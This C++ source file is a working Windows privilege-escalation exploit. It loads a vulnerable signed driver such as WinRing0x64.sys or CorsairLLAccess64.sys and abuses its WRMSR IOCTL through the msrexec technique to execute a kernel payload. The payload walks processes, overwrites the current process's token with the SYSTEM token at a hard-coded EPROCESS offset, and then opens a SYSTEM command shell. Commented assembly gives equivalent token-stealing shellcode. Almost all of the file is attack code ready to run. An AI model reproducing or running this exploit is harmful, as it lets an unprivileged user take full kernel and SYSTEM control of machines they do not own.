// Modified by jsacco <jsacco@exploitpack.com>
// https://exploitpack.com

#include "msrexec.hpp"
#include "vdm.hpp"
#include <iostream>
#include <windows.h>
#include <print>

// Kernel exports resolved via get_system_routine_t
using ex_alloc_pool_t = void* (*)(std::uint32_t /*POOL_TYPE*/, std::size_t /*NumberOfBytes*/);
using dbg_print_t = void  (*)(const char*, ...);

// ---- kernel-ish types (no WDK headers) ----
using KPEPROCESS = void*;
using KPETHREAD = void*;
using KKIRQL = unsigned char;
using KNTSTATUS = long;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((KNTSTATUS)(Status) >= 0)
#endif

// ---- Function pointer types  ----
using DbgPrint_t = void       (*)(const char*, ...);
using PsGetCurrentProcess_t = KPEPROCESS(*)(void);
using PsGetCurrentThread_t = KPETHREAD(*)(void);
using PsGetNextProcess_t = KPEPROCESS(*)(KPEPROCESS /*Process*/);
using PsGetProcessId_t = void* (*)(KPEPROCESS /*Process*/);
using PsGetProcessImageFileName_t = const char* (*)(KPEPROCESS /*Process*/);
using PsLookupProcessByProcessId_t = KNTSTATUS(*)(void* /*PID*/, KPEPROCESS* /*OutProcess*/);
using PsReferencePrimaryToken_t = void* (*)(KPEPROCESS /*Process*/);
using ObDereferenceObject_t = void       (*)(void* /*Object*/);
using KeGetCurrentIrql_t = KKIRQL(*)(void);

// Simple ANSI→UTF-16 helper
inline std::wstring ToWide(const std::string& s)
{
    if (s.empty()) return std::wstring();
    int need = MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w;
    w.resize(need ? (need - 1) : 0);
    if (need > 1) {
        MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, &w[0], need);
    }
    return w;
}

/*
 * Kernel payload executed by msrexec.exec(...)
 * Signature void (*)(void* krnl_base, get_system_routine_t get_kroutine)
 *  - krnl_base: base address of ntoskrnl in kernel VA space
 *  - get_kroutine: resolver (usually RtlFindExportedRoutineByName) call to get pointers to kernel routines by name.
 */
void MyKernelPayload(void* krnl_base, get_system_routine_t get_kroutine)
{
    const auto dbg_print = reinterpret_cast<DbgPrint_t>(
        get_kroutine(krnl_base, "DbgPrint"));

    const auto ex_alloc_pool = reinterpret_cast<ex_alloc_pool_t>(
        get_kroutine(krnl_base, "ExAllocatePool"));

    const auto PsGetCurrentProcess = reinterpret_cast<PsGetCurrentProcess_t>(
        get_kroutine(krnl_base, "PsGetCurrentProcess"));

    const auto PsGetCurrentThread = reinterpret_cast<PsGetCurrentThread_t>(
        get_kroutine(krnl_base, "PsGetCurrentThread"));

    const auto PsGetNextProcess = reinterpret_cast<PsGetNextProcess_t>(
        get_kroutine(krnl_base, "PsGetNextProcess"));

    const auto PsGetProcessId = reinterpret_cast<PsGetProcessId_t>(
        get_kroutine(krnl_base, "PsGetProcessId"));

    const auto PsGetProcessImageFileName = reinterpret_cast<PsGetProcessImageFileName_t>(
        get_kroutine(krnl_base, "PsGetProcessImageFileName"));

    const auto PsLookupProcessByProcessId = reinterpret_cast<PsLookupProcessByProcessId_t>(
        get_kroutine(krnl_base, "PsLookupProcessByProcessId"));

    const auto PsReferencePrimaryToken = reinterpret_cast<PsReferencePrimaryToken_t>(
        get_kroutine(krnl_base, "PsReferencePrimaryToken"));

    const auto ObDereferenceObject = reinterpret_cast<ObDereferenceObject_t>(
        get_kroutine(krnl_base, "ObDereferenceObject"));

    const auto KeGetCurrentIrql = reinterpret_cast<KeGetCurrentIrql_t>(
        get_kroutine(krnl_base, "KeGetCurrentIrql"));

    // Use them (only if resolved)
    if (dbg_print)
    {
        if (KeGetCurrentIrql)
            dbg_print("[msrw:test] Hello from Kernel; IRQL=%u\n", (unsigned)KeGetCurrentIrql());
        else
            dbg_print("[msrw:exploit] Hello from Kernel; (KeGetCurrentIrql not found)\n");
    }

    if (dbg_print && ex_alloc_pool)
    {
        void* p = ex_alloc_pool(0 /*legacy NonPagedPool*/, 0x1000);
        dbg_print("[msrw:exploit] allocated pool -> 0x%p\n", p);
        dbg_print("[msrw:exploit] cr4 -> 0x%p\n", __readcr4());
    }

    if (dbg_print && PsGetCurrentProcess && PsGetCurrentThread && PsGetProcessId && PsGetProcessImageFileName)
    {
        KPEPROCESS cur = PsGetCurrentProcess();
        KPETHREAD  thr = PsGetCurrentThread();
        auto curPid = (unsigned long)(uintptr_t)PsGetProcessId(cur);
        const char* curImg = PsGetProcessImageFileName(cur);

        dbg_print("[msrw:exploit] current: EPROCESS=%p ETHREAD=%p pid=%lu image=%s\n",
            cur, thr, curPid, curImg ? curImg : "<null>");
    }

    // Peek SYSTEM (PID 4) safely and print its token pointer (no modification)
    if (dbg_print && PsLookupProcessByProcessId && PsGetProcessId &&
        PsGetProcessImageFileName && PsReferencePrimaryToken && ObDereferenceObject)
    {
        KPEPROCESS sysProc = nullptr;
        if (NT_SUCCESS(PsLookupProcessByProcessId((void*)4, &sysProc)) && sysProc)
        {
            const char* sysName = PsGetProcessImageFileName(sysProc);
            auto sysPid = (unsigned long)(uintptr_t)PsGetProcessId(sysProc);
            dbg_print("[msrw:exploit] SYSTEM: EPROCESS=%p pid=%lu image=%s\n",
                sysProc, sysPid, sysName ? sysName : "<null>");

            void* tok = PsReferencePrimaryToken(sysProc);
            if (tok) {
                dbg_print("[msrw:exploit] SYSTEM primary token=%p\n", tok);
                ObDereferenceObject(tok);
            }
            ObDereferenceObject(sysProc);
        }
    }

    // Enumerate up to 10 processes (read-only)
    if (dbg_print && PsGetNextProcess && PsGetProcessId && PsGetProcessImageFileName)
    {
        KPEPROCESS it = nullptr; int shown = 0;
        while ((it = PsGetNextProcess(it)) && shown < 10)
        {
            auto pid = (unsigned long)(uintptr_t)PsGetProcessId(it);
            const char* img = PsGetProcessImageFileName(it);
            dbg_print("[msrw:exploit] pid=%lu image=%s\n", pid, img ? img : "<null>");
            ++shown;
        }
        dbg_print("[msrw:exploit] payload done.\n");
    }



    using DbgPrint_t = void (*)(const char*, ...);
    using PsGetCurrentProcess_t = void* (*)(void);
    using PsLookupProcessByProcessId_t = long (*)(void* pid, void** outProcess);
    using PsReferencePrimaryToken_t = void* (*)(void* Process);
    using ObDereferenceObject_t = void (*)(void* Object);

    auto DbgPrint = (DbgPrint_t)get_kroutine(krnl_base, "DbgPrint");

    if (!DbgPrint || !PsGetCurrentProcess || !PsLookupProcessByProcessId || !PsReferencePrimaryToken || !ObDereferenceObject)
        return;

    void* systemProcess = nullptr;
    if (PsLookupProcessByProcessId((void*)4, &systemProcess) != 0 /*STATUS_SUCCESS*/) {
        DbgPrint("[exploit] could not find SYSTEM process\n");
        return;
    }

    void* systemToken = PsReferencePrimaryToken(systemProcess);
    void* currentProcess = PsGetCurrentProcess();

    if (systemToken && currentProcess) {
        // --- Directly overwrite the EPROCESS->Token field ---
        // Offsets differ between Windows builds; hard-coding is fragile.
        // This is equivalent to mov [CurrentProcess + 0x4b8], SystemToken.
        SIZE_T* currentTokenField = (SIZE_T*)((char*)currentProcess + 0x4b8); // 0x4b8: Token offset (Win10 x64 typical)
        *currentTokenField = (SIZE_T)systemToken & ~0xF; // clear low 4 bits (_EX_FAST_REF)

        DbgPrint("[exploit] token of current process replaced with SYSTEM token=%p\n", systemToken);
    }

    if (systemToken) ObDereferenceObject(systemToken);
    if (systemProcess) ObDereferenceObject(systemProcess);

    // Token replacementent code in ASM:
    /*
    [BITS 64]
    start:
      mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
      mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
      mov r8, rax               ; Store current _EPROCESS ptr in RBX

    loop:
      mov r8, [r8 + 0x448]      ; ActiveProcessLinks
      sub r8, 0x448             ; Go back to start of _EPROCESS
      mov r9, [r8 + 0x440]      ; UniqueProcessId (PID)
      cmp r9, 4                 ; SYSTEM PID? 
      jnz loop                  ; Loop until PID == 4

    replace:
      mov rcx, [r8 + 0x4b8]      ; Get SYSTEM token
      and cl, 0xf0               ; Clear low 4 bits of _EX_FAST_REF structure
      mov [rax + 0x4b8], rcx     ; Copy SYSTEM token to current process

    cleanup:
      mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
      mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
      inc cx
      mov [rax + 0x1e4], cx
      mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
      mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
      mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
      mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
      mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
      xor eax, eax  ;
      swapgs
      o64 sysret  
    */
}

// Open an already-loaded device by symbolic link name (2nd arg)
static HANDLE OpenExistingDeviceByName(const std::wstring& devNameW)
{
    if (devNameW.empty()) return INVALID_HANDLE_VALUE;
    std::wstring wsymlink = L"\\\\.\\" + devNameW;

    HANDLE hDev = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 30; ++i) { // ~300ms retry window
        hDev = ::CreateFileW(
            wsymlink.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );
        if (hDev != INVALID_HANDLE_VALUE) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    return hDev;
}


int __cdecl main(int argc, char** argv)
{
    if (argc != 4) {
        std::printf("Usage: msrexec.exe <driver.sys> devicename ioctlcode\n\nrff");
        std::printf("Example with device name: msrexec.exe WinRing0x64.sys WinRing0_1_2_0 0x9c402088\n");
        std::printf("Example without device name: msrexec.exe CorsairLLAccess64.sys NONE 0x229384\n");
        std::printf("------------------------------------------------------------------------------\n");
        std::printf("IOCTL WRMSR: 0x9c402088 - WinRing0.sys - Device: WinRing0_1_2_0 - sub_114C8\n");
        std::printf("IOCTL WRMSR: 0x229384 - CorsairLLAccess64.sys - Device: None - sub_1400019BC\n");
        return 2;
    }
    std::wstring wpath = vdm::ToWide(argv[1]);          // driver.sys path
    std::wstring wkey = vdm::ToWide(argv[2]);          // service/device key name (e.g. "WinRing0_1_2_0")
    char* end = nullptr;
    DWORD ioctl_code = static_cast<DWORD>(strtoul(argv[3], &end, 0));

    // -----------------------------------------------------------------------------
        // Ask user: use already-loaded driver? (YES -> open \\.\DeviceName ; NO -> load .sys)
        // -----------------------------------------------------------------------------
    bool use_existing = false;
    std::printf("[?] Yes: Open existing device: \\\\.\\%s | No: Create a new device.  \nPlease choose: (y/n): ",
        vdm::ToNarrow(wkey).c_str());
    {
        std::string answer;
        std::getline(std::cin, answer);
        if (!answer.empty() && (answer[0] == 'y' || answer[0] == 'Y'))
            use_existing = true;
    }

    HANDLE drv_handle = nullptr;
    std::string drv_key;
    LONG drv_status = STATUS_SUCCESS;
    bool loaded_by_us = false;



    if (use_existing) {
        // Open \\.\DeviceName from arg2
        std::wstring lower = wkey;
        std::transform(lower.begin(), lower.end(), lower.begin(), [](wchar_t c) { return (wchar_t)towlower(c); });
        if (lower.find(L"none") != std::wstring::npos) {
            std::printf("[!] You chose YES but device name is 'NONE'. Cannot open existing device.\n");
            return 1;
        }

        HANDLE hDev = OpenExistingDeviceByName(wkey);
        if (hDev == INVALID_HANDLE_VALUE) {
            std::printf("[!] Failed to open existing device \\\\.\\%s (GLE=%lu)\n", vdm::ToNarrow(wkey).c_str(), GetLastError());
            return 1;
        }

        vdm::drv_handle = hDev;
        drv_handle = hDev;
        drv_key = vdm::ToNarrow(wkey);  // just for printing
        drv_status = STATUS_SUCCESS;
        loaded_by_us = false;

        std::printf("[*] Using already-loaded device -> \\\\.\\%s (handle=0x%p)\n",
            drv_key.c_str(), (void*)drv_handle);
    }
    else {
        // Load driver from file
        const auto [h, key, st] = vdm::load_drv_from_file(wpath, wkey);
        drv_handle = h;
        drv_key = key;
        drv_status = st;
        loaded_by_us = true;

        if (drv_status != STATUS_SUCCESS || !drv_handle) {
            std::printf("[!] Failed to load driver... reason -> 0x%x\n", drv_status);
            return 1;
        }

        std::printf("[*] Loaded driver -> handle=0x%p  key=%s  status=0x%x\n",
            (void*)drv_handle, drv_key.c_str(), drv_status);
    }

    std::printf("[*] Driver handle -> 0x%x\n[*] Driver key -> %s\n[*] Driver status -> 0x%x\n",
        drv_handle, drv_key.c_str(), drv_status);
    std::printf("[*] ntoskrnl base address -> 0x%p\n", utils::kmodule::get_base("ntoskrnl.exe"));
    std::printf("[*] NtShutdownSystem -> 0x%p\n", utils::kmodule::get_export("ntoskrnl.exe", "NtShutdownSystem"));

    // Bind user-mode write-msr hook used by msrexec
    writemsr_t _write_msr = [&](std::uint32_t reg, std::uintptr_t value) -> bool {
        return vdm::writemsr(reg, value, ioctl_code);
        };

    // Create msrexec context and run the kernel payload
    vdm::msrexec_ctx msrexec(_write_msr);
    msrexec.exec(&MyKernelPayload);

   // OPTIONAL: Load Control Pack agent with Kernel access instead.
   // std::printf("\n######## Loading CP Agent ########");
   // std::printf("\n[*] Control Pack DLL agent is running");
   // HMODULE hLibCP = LoadLibrary(L"ControlPack.dll");
   // std::getchar();

    std::printf("[*] Writing to MSR! Spawning a new CMD process\n");
    std::printf("[*] Press ENTER to continue to your shell..\n");
    std::getchar();
    std::system("cmd.exe");

    // -------------------------
       // Cleanup
       // -------------------------
    if (loaded_by_us) {
        // Unload helper driver that we loaded
        std::wstring lowerKey = vdm::ToWide(drv_key);
        std::transform(lowerKey.begin(), lowerKey.end(), lowerKey.begin(), [](wchar_t c) { return (wchar_t)towlower(c); });

        LONG unload_result = vdm::unload_drv(drv_handle, drv_key);
        if (unload_result != STATUS_SUCCESS) {
            std::printf("[!] Unable to unload driver... reason -> 0x%x\n", unload_result);
            return 1;
        }
        else {
            std::printf("[*] Driver unloaded successfully -> 0x%x\n", unload_result);
        }
    }
    else {
        // We did not load it; just close our handle.
        if (drv_handle && drv_handle != INVALID_HANDLE_VALUE) {
            ::CloseHandle(drv_handle);
            vdm::drv_handle = nullptr;
        }
        std::printf("[*] Closed handle to existing device. (No unload performed.)\n");
    }

    return 0;
}
